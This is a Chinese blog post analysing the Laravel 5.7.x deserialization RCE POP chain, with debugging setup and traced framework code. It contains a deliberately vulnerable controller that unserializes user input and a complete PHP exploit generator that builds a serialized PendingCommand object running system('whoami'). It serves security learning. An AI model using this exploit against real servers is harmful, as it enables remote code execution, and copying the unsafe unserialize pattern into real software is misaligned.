---
title: Laravel漏洞分析
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-04-17 12:14:05
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1140593.jpg
---
又给自己挖了个大坑。。。

## 通过phpStudy搭建Laravel
从github上把源码down下来：https://github.com/laravel/laravel/releases?after=v5.8.35
然后在根目录打开cmd：composer intsall 生成vender目录
改hosts 路径：C:\Windows\System32\drivers\etc\hosts
添加127.0.0.1 www.fuck.com(Laravel必须由域名访问
最后把根目录下.env.example中的内容复制到.env中（记得localhost改成www.fuck.com），cmd中执行php artisan key:generate即可。
访问出现没有error就是搭建成功：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210417221038.png)
————————
后记：改hosts那一步可能不是必须的。
## 如何利用phpStorm进行动态调试
这一步是后面要用的，在进行代码审计时，通过调试进行分析是非常重要的，所以虽然有些小麻烦，但是必须会用。
需要的环境：phpStorm+Xdebug+phpStudy
phpStudy自带了xdebug插件，但是默认是关闭的，手动选择开启：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418141556.png)

更改配置文件，我这里用的是7.3.4nts

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418141751.png)
只要改选中的部分，别的默认即可：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418141902.png)
（这里我用9100端口是因为有时候9000会被占用，为了避免后面冲突的麻烦换成了和网上教程都不一样的9100）

接下来 浏览器上下载Xdebug helper

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418142135.png)
在url栏后面的小虫。

然后就是配置phpStorm

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418143756.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418143825.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418143904.png)

下断点 浏览器刷新：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418144030.png)
红点中打勾就说明已经成功断下来了。
## Laravel 5.7.x 反序列化漏洞分析
laravel 5.7是一款基于php 7.1.3之上运行的优秀php开发框架,反序列化RCE漏洞出现在核心包中，但是需要对基于laravel v5.7框架进行二次开发的cms出现可控反序列化点，才能触发漏洞实现RCE。

由于在本地搭建的仅仅是Laravel一个空架子，所以还需要手动添加一个反序列化点。
在routes\web.php增加一个路由:

    Route::get('/index','TaskController@index');

新建app\Http\Controllers\TaskController.php，并且在此增加反序列化入口：

    <?php
    namespace App\Http\Controllers;
    
    class TaskController
    {
        public function index(){
            if(isset($_GET['ser'])){
                $ser = $_GET['ser'];
                unserialize($ser);
                return ;
            }else{
                echo "no unserialization";
                return ;
            }
        }
    }
    ?>
将Laravel 5.6和5.7版本进行对比，在vendor\laravel\framework\src\Illuminate\Foundation\Testing\下新版本多出了一个文件PendingCommand.php：
public$test;//一个实例化的类 Illuminate\Auth\GenericUser
protected$app;//一个实例化的类 Illuminate\Foundation\Application
protected$command;//要执行的php函数 system
protected$parameters;//要执行的php函数的参数  array('id')

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210417225934.png)
PendingCommand.php中run函数用来执行命令，而destruct中又调用了run函数。所以简单的 POP 链为：构造的 exp 经过反序列化后调用 __destruct()，进而调用 run(),run() 进行代码执行。

现在通过exp来动态调试对利用链进行分析:
在执行unserialize后需要加载类，这里是通过src\Illuminate\Foundation\AliasLoader.php中load方法进行类的加载：

桥豆麻袋，在这一步之前需要会用phpStorm进行动态调试，教程在上面。

跟进unserialize：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210418144310.png)

static::$facadeNamespace是一个字符串常量：Facades\
来看下这是个什么东西：
Facades（读音：/fəˈsäd/ ）为应用程序的服务容器中可用的类提供了一个「静态」接口。Laravel 自带了很多 facades ，几乎可以用来访问到 Laravel 中所有的服务。Laravel facades 实际上是服务容器中那些底层类的「静态代理」，相比于传统的静态方法， facades 在提供了简洁且丰富的语法同时，还带来了更好的可测试性和扩展性。
Laravel 框架门面 Facade 源码分析：https://learnku.com/articles/4684/analysis-of-facade-source-code-of-laravel-frame

概括一下：门面相对于其他方法来说，最大的特点就是简洁。

因此总结一下，此时加载ArrayInput类和Mockery类就会进行如下操作：

1.需要加载的类是否为facede门面类，如果是则调用$this->loadFacade
2.Illuminate\Support\Facades命名空间来查找是否属于这些alias

alias是类的别名，class_alias函数可以为任何类创建别名，而在Laravel启动后为各个门面类调用了class_alias函数，因此不必直接用类名，在config文件夹的app文件里面存放着门面与类名的映射.
Mockery类并非门面类，因此进入后面的if后通过loadClass方法调用findfile()函数通过classMap中定义的命名空间和对应类的地址的映射来获得所要加载类对应的类文件地址，找到类地址后通过includeFile来将该类进行包含：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419140404.png)

到这Laravel加载类的方式应该也比较清楚了，到此完成了对整个利用类，也就是PendingCommand类的加载已经完成。

下面进入该类的析构方法：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419141356.png)
这里hasExecuted默认为false，图片太长了没截到。
然后进入$this->run方法：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419141857.png)

使用Mockery::mock实现对象的模拟：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419142223.png)

这里涉及到类的加载，因此再次会调用load方法来加载类,回到load那里重复一遍，这里就直接跳过了。接着会调用$this->createABufferedOutputMock()方法，我们跟进该方法：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419194504.png)

很明显如果这里expectedOutput不是数组的话就会立刻报错，利用链无法继续。所以全局找一下这个属性看看有没有可控的地方：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419195147.png)

发现只有测试类有该属性。而测试类一般不会加载，那有何办法能够凭空创造expectedOutput属性呢？

魔术方法。当类的成员属性被设定为private甚至是没有该成员属性时如果我们去获取这个不存在或者是私有属性，则会触发该类的__get()魔术方法。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419200615.png)

能搜出来一堆，这里和网上文章一样选择//vendor\laravel\framework\src\Illuminate\Auth\GenericUser.php这里的。

    class GenericUser implements UserContract
    {
    public function __construct(array $attributes)
        {
            $this->attributes = $attributes;
        }
    public function __get($key)
        {
            return $this->attributes[$key];
        }
    }

只需要使得$this->test为GenericUser类，并且让attributes中存在键名为expectedOutput的数组，这样便可以跳出循环，使得利用链能够继续。
回到mockConsoleOutput():

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419201646.png)

这里还有一个需要数组的地方，方法同上。

接下来就到了利用链的关键处：

    try {
                $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
            } catch (NoMatchingExpectationException $e) {
                if ($e->getMethodName() === 'askQuestion') {
                    $this->test->fail('Unexpected question "'.$e->getActualArguments()[0]->getQuestion().'" was asked.');
                }
    
                throw $e;
            }

来看后面的调用栈：
这里我没断到后面的调用栈，不知道是什么原因，偷图：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419210850.png)

————
后记：这里可能是要边调边显示的，调到后面就出来了。

Kernel::class是一个定量，其值为Illuminate\Contracts\Console\Kernel这个类，我们持续跟进后几个调用栈：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419211048.png)

在进入make()方法,因为只有一个$key参数，所以第二个参数是空值

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419211443.png)

再调用父类的make方法，此时parameters为空：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419211712.png)

跟进下面这个resolve方法：

     /**
         * Resolve the given type from the container.
         *
         * @param  string  $abstract
         * @param  array  $parameters
         * @return mixed
         */
        protected function resolve($abstract, $parameters = [])
        {
            $abstract = $this->getAlias($abstract);
    
            $needsContextualBuild = ! empty($parameters) || ! is_null(
                $this->getContextualConcrete($abstract)
            );

            // If an instance of the type is currently being managed as a singleton we'll
            // just return an existing instance instead of instantiating new instances
            // so the developer can keep using the same objects instance every time.
            if (isset($this->instances[$abstract]) && ! $needsContextualBuild) {
                return $this->instances[$abstract];
            }

            $this->with[] = $parameters;
    
            $concrete = $this->getConcrete($abstract);
    
            // We're ready to instantiate an instance of the concrete type registered for
            // the binding. This will instantiate the types, as well as resolve any of
            // its "nested" dependencies recursively until all have gotten resolved.
            if ($this->isBuildable($concrete, $abstract)) {
                $object = $this->build($concrete);
            } else {
                $object = $this->make($concrete);
            }

            // If we defined any extenders for this type, we'll need to spin through them
            // and apply them to the object being built. This allows for the extension
            // of services, such as changing configuration or decorating the object.
            foreach ($this->getExtenders($abstract) as $extender) {
                $object = $extender($object, $this);
            }

            // If the requested type is registered as a singleton we'll want to cache off
            // the instances in "memory" so we can return it later without creating an
            // entirely new instance of an object on each subsequent request for it.
            if ($this->isShared($abstract) && ! $needsContextualBuild) {
                $this->instances[$abstract] = $object;
            }
    
            $this->fireResolvingCallbacks($abstract, $object);
    
            // Before returning, we will also set the resolved flag to "true" and pop off
            // the parameter overrides for this build. After those two things are done
            // we will be ready to return back the fully constructed class instance.
            $this->resolved[$abstract] = true;
    
            array_pop($this->with);
    
            return $object;
        }

第一种思路：

我们看到resolve方法中:

    // namespace Illuminate\Container
    if (isset($this->instances[$abstract]) && ! $needsContextualBuild) {
                return $this->instances[$abstract];
            }

如果我们可以控制$this->instances，那么我们将有可能返回一个任意对象，最终该对象会赋值给$this->app[Kernel::class]，在这里选取的是\Illuminate\Foundation\Application，该类同样继承自Containers,因此同样会进入该方法，此时$this就是Application这个实例，而我们想要返回的同样也是该类，因此我们需要做的是

Application->instances['Illuminate\Contracts\Console\Kernel'] = Application

至于为何选取Application在之后分析过程中也就明了了：

分析到这我们可以先构造部分EXP:

    <?php
    namespace Illuminate\Foundation\Testing{
    //执行函数所在处
        use PHPUnit\Framework\TestCase as PHPUnitTestCase;
    
        class PendingCommand{
            protected $app;
            protected $command;
            protected $parameters;
            public $test;
            public function __construct($test, $app, $command, $parameters)
            {
                $this->app = $app;
                $this->test = $test;
                $this->command = $command;
                $this->parameters = $parameters;
            }
        }    
    }
    
    namespace Illuminate\Auth{
    //此处和下面一样都是触发get的，二选一即可
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes)
            {
                $this->attributes = $attributes;
            }
            public function __get($key)
            {
                return $this->attributes[$key];
            }
        }
    }
    //__get方法也同样可以使用如下类
    namespace Faker{
        class DefaultGenerator{
            protected $default;
            public function __construct($default = null)
            {
                $this->default = $default;
            }
            public function __get($attribute)
            {
                return $this->default;
            }
        }
    }
    
    namespace Illuminate\Foundation{
        class Application{
            protected $instances = [];
            public function __construct($instances = [])
            {
                $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
            }
        }
    }
    
    namespace {
        $genericuser = new Illuminate\Auth\GenericUser(
            array(
                //这里需要两次使用来循环获得以便成功跳过方法,两次键名分别为expectedOutput和expectedQuestions
                "expectedOutput"=>array("crispr"=>"0"),
                "expectedQuestions"=>array("crispr"=>"1")
            )
        );
        $app = new Illuminate\Foundation\Application();
        //通过如下步骤最终获得的$this->app[Kernel::class]就是该Application实例
        $application = new Illuminate\Foundation\Application($app);
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
            $genericuser,
            $application,
            "system",
            array("whoami")
       );
        echo urlencode(serialize($pendingcommand));
    }

选择application类的理由：
此时的$this和instances均为application类，此时赋值给$this->app[Kernel::class]，在继续调用call方法时，由于application类没有call方法，根据特性会寻找其父类也就是Container类的call方法:

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419215106.png)

此时$callback为system而$parameters为whoami，继续跟进：、

    public static function call($container, $callback, array $parameters = [], $defaultMethod = null)
        {
            if (static::isCallableWithAtSign($callback) || $defaultMethod) {
                return static::callClass($container, $callback, $parameters, $defaultMethod);
            }
    
            return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) {
                return call_user_func_array(
                    $callback, static::getMethodDependencies($container, $callback, $parameters)
                );
            });
        }

此时$callback = system,判断是否进入isCallableWithAtSign:

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419220228.png)

显然无法满足，进入第二个分支：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419220542.png)

可以看到getMethodDependencies方法只是将一个空数组和$parameters进行合并，合并后的数据依然是可控的，最终通过call_user_func_array(‘system’,array(‘whoami’))执行命令，这也是$parameters为数组的原因，因为call_user_func_array第二个参数要求是数组形式。

第二种思路：

没有进入该if语句，继续往下运行会进入getConcrete()方法，而其中的关键方法就是getConcrete()，我们在继续跟进:

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210419222846.png)

看了后面思路与方法一大致相同 就不写了。

复现思路：https://www.anquanke.com/post/id/230005
总结：虽然还是不能完全看懂，但是对Laravel框架和此反序列化rce的执行流程有了基本的了解，以后熟练了必须再回来自己理一遍。